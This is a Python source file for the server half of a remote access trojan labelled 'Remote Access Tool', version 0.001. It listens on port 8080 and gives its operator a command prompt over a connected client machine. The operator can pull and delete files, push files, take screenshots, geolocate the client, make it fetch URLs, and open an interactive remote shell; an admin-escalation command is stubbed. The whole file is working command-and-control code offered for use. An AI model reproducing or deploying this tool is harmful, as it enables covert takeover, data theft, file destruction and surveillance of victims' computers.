"""
server.py
version = 0.001
Remote Access Tool
Made by Lukas Alstrup
github.com/LukasAlstrup/rat

"""
import os
import socket
import base64
import random
import datetime
import time

#Welcome
print("[+] Welcome to Lukas Alstrup's Remote Access tool")
print("""  _     _    _ _  __           _____            _       _____ _______ _____  _    _ _____  
 | |   | |  | | |/ /    /\    / ____|     /\   | |     / ____|__   __|  __ \| |  | |  __ \ 
 | |   | |  | | ' /    /  \  | (___      /  \  | |    | (___    | |  | |__) | |  | | |__) |
 | |   | |  | |  <    / /\ \  \___ \    / /\ \ | |     \___ \   | |  |  _  /| |  | |  ___/ 
 | |___| |__| | . \  / ____ \ ____) |  / ____ \| |____ ____) |  | |  | | \ \| |__| | |     
 |______\____/|_|\_\/_/    \_\_____/  /_/    \_\______|_____/   |_|  |_|  \_\\____/|_|     
                                                                                           
                                                                                           """)

#Listen
s = socket.socket()
#host = socket.gethostname()
host = "0.0.0.0"
port = 8080
s.bind((host, port))
print("[+] The listener has been started...")
print("[+] LHOST = ", host)
print("[+] LPORT = ", port)
print("[+] Waiting for incomming connections")
s.listen(1) #Change 1 for multiple connections
conn, addr = s.accept()
print("[+] ", addr, "has connected to the server successfully")

#Get username from the client
username = conn.recv(10000000)





def main():

    name = str(str(username.decode()) + "@" + str(addr[0])+ " :~# ")

    def pwd():
        conn.send(command.encode())
        print("[+] Command has been sent. Waiting for execution...")
        files = conn.recv(5000) #bytes
        files = files.decode()
        print("[+] Command output: ", files)
    
    def custom_dir():
        conn.send(command.encode())
        user_input = str(input("Custom directory: "))
        conn.send(user_input.encode())
        print("[+] Command has been sent")
        files = conn.recv(5000)
        files = files.decode()
        print("[+] Directory:\n", files)

    def download_file():
        conn.send(command.encode())
        filepath = str(input("Please enter filepath to the file on the client machine: "))
        conn.send(filepath.encode())
        file = conn.recv(10000)
        filename = str(input("Please enter a filename for the file you want to download: "))
        newfile = open(filename, "wb")
        newfile.write(file)
        newfile.close()
        print(filename, " has been downloaded and saved")

    def remove_file():
        conn.send(command.encode())
        file_and_dir = str(input("Please enter filepath to the file you want to delete on the client machine: "))
        conn.send(file_and_dir.encode())
        print("[+] ", file_and_dir, " has been deleted successfully...")

    def send_file():
        conn.send(command.encode())
        file = str(input("Please enter path to the file you want to send: "))
        filename = str(input("Please enter filename for the file on the client machine: "))
        data = open(file, "rb")
        file_data = data.read(70000000) #bytes
        conn.send(file.encode())
        print(file, "has been sent successfully")
        conn.send(file_data)

    def screenshot():
        conn.send(command.encode())
        print("Taking screenshot of client")
        screenshot_data = conn.recv(1000000) # Receive the image
        time = datetime.datetime.now()
        screenshot_name = "Screenshot" + time.strftime("%y-%m-%H-%M-%S") + ".png"
        screenshot_file = open(screenshot_name, "wb+") # Open the screenshot_file in write bytes mode
        screenshot_file.write(screenshot_data) #Write the screenshot_data to the screenshot_file
        screenshot_file.close() # Save the screenshot_file
        print("File has been saved and is ready to be opened")
        print("Image path: ", os.path.abspath(screenshot_name))

    def geolocate():
        conn.send(command.encode())
        print("Geolocating client...")
        geolocation = conn.recv(5000)
        geolocation = geolocation.decode()
        geolocation_coordinates = conn.recv(5000)
        geolocation_coordinates = geolocation_coordinates.decode()
        print("[*] Note: This may not be accurate (https://whatismyipaddress.com/geolocation-accuracy)")
        print(geolocation_coordinates)
        print(geolocation)

    def download_url():
        conn.send(command.lower().encode())
        url = str(input("Please enter a URL to download: "))
        conn.send(url.encode())
        filename = str(input("Please enter a filename: "))
        conn.send(filename.encode())
        print("Send everything to the client... It should work now (:")
    
    def cmd(): # Interact with the command prompt
        conn.send(command.encode())
        while True:
            cmd_command = input()
            if cmd_command == 'quit':
                break
            if len(str.encode(cmd_command)) > 0:
                conn.send(str.encode(cmd_command))
                client_response = str(conn.recv(13107200).decode())

                client_response = client_response.replace('Den angivne sti blev ikke fundet.', "") # Gets rid of false errors
                print(client_response, end="")
    
    



        """
        cmd_command = str(input("=> "))
        print("Sending cmd_command to the client...")
        conn.send(cmd_command.encode())
        print("Sent cmd_command to the client...")
        output = conn.recv(1000).decode()
        print("Received cmd_command from the client... Printing it...")
        print(output)
        """

    def get_admin():
        conn.send(command.encode())
        
        
 
    def get_help():
        print("")
        print("List of commands")
        print("FOLDER STUFF")
        print("pwd - print working directory")
        print("custom_dir - show what is in a folder")
        print("download_file - download a file and save it on the server")
        print("remove_file - delete a file from the client")
        print("send_file - send a file to the client")
        print("")
        print("OTHER")
        print("geolocate - get latitude and longtitude of the client")
        print("screenshot - make a screenshot of the client (Not working yet)")
        print("")

    def error(error_msg):
        print("[-] There was an unexpected error. Here is the error message: ", error_msg)
        
        
    while True:
        
        command = str(input(name))

        #try:
        if command == "pwd":
            pwd()

        if command == "custom_dir":
            custom_dir()

        if command == "download_file":
            download_file()

        if command == "remove_file":
            remove_file()

        if command == "send_file":
            send_file()

        if command == "screenshot":
            screenshot()

        if command == "geolocate":
            geolocate()

        if command == "download_url":
            download_url()

        if command == "cmd":
            cmd()                

        if command == "help":
            get_help()
        
        if command == "get_admin":
            get_admin()

        #except Exception as error_msg:
        #    error(error_msg)
        

            

main()